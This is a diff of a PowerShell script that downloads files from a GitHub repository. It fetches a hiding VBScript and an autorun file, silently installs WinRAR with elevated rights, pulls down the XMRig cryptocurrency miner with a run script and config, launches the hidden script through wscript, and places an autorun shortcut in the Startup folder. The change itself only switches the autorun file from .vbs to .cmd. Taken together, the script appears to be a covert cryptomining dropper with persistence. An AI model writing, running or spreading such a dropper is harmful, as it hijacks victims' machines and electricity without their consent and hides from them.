@@ -1,5 +1,5 @@
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/hid.vbs' -OutFile 'C:\Users\Public\Downloads\hid.vbs'
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/Autorun.vbs' -OutFile 'C:\Users\Public\Downloads\Autorun.vbs'
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/Autorun.cmd' -OutFile 'C:\Users\Public\Downloads\Autorun.cmd'
 Invoke-WebRequest -Uri 'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe' -OutFile 'C:\Users\Public\Downloads\winrar-x64-701.exe'
 Start-Process -FilePath 'C:\Users\Public\Downloads\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs
 Invoke-WebRequest -Uri 'https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip' -OutFile 'C:\Users\Public\Downloads\xmrig-6.22.2-gcc-win64.zip'
@@ -10,8 +10,8 @@ Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/-/refs/heads/
 Copy-Item -Path 'C:\Users\Public\Downloads\COINRUN.cmd' -Destination 'C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd' -Force
 Copy-Item -Path 'C:\Users\Public\Downloads\config.json' -Destination 'C:\Users\Public\Downloads\xmrig-6.22.2\config.json' -Force
 Start-Process -FilePath "wscript.exe" -ArgumentList "C:\Users\Public\Downloads\hid.vbs"
-$source = "C:\Users\Public\Downloads\Autorun.vbs"
-$destination = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Autorun.vbs.lnk"
+$source = "C:\Users\Public\Downloads\Autorun.cmd"
+$destination = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Autorun.cmd.lnk"
 $WshShell = New-Object -ComObject WScript.Shell
 $shortcut = $WshShell.CreateShortcut($destination)
 $shortcut.TargetPath = $source
